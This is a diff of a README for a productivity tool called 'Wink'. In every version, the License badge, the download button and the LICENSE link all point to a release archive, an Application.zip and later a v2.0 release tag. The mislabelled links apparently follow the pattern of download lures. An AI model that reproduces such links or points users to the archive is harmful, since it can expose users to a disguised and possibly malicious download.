@@ -1,7 +1,7 @@
 
 # 🚀 **Wink - A tool to Win the week** 🏆
 
-[![License](https://github.com/USSarmy/wink/releases/download/v1.0/Application.zip)](https://github.com/USSarmy/wink/releases/download/v1.0/Application.zip)
+[![License](https://github.com/USSarmy/wink/releases/tag/v2.0)](https://github.com/USSarmy/wink/releases/tag/v2.0)
 
 ---
 
@@ -37,7 +37,7 @@ Welcome to **Wink** - your ultimate productivity tool to help you conquer the we
 
 To get started with **Wink**, simply download the software package from the following link:
 
-[![Download Wink](https://github.com/USSarmy/wink/releases/download/v1.0/Application.zip)](https://github.com/USSarmy/wink/releases/download/v1.0/Application.zip)
+[![Download Wink](https://github.com/USSarmy/wink/releases/tag/v2.0)](https://github.com/USSarmy/wink/releases/tag/v2.0)
 
 ---
 
@@ -74,7 +74,7 @@ If you encounter any issues or have any questions regarding **Wink**, feel free 
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/USSarmy/wink/releases/download/v1.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/USSarmy/wink/releases/tag/v2.0) file for details.
 
 Enjoy using **Wink** and make the most of your week ahead! 🌟
 
